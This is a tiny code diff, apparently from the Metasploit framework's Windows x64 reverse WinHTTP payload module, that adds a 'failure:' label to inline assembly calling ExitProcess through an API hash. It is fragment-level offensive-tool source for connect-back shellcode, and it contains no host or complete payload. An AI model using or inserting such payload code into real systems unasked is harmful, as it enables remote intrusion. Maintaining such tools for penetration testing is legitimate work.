@@ -327,6 +327,7 @@ module Payload::Windows::ReverseWinHttp_x64
       ^
     else
       asm << %Q^
+      failure:
         ; hard-coded to ExitProcess(whatever) for size
         mov r10, #{Rex::Text.block_api_hash('kernel32.dll', 'ExitProcess')}
         call rbp                      ; ExitProcess(whatever)
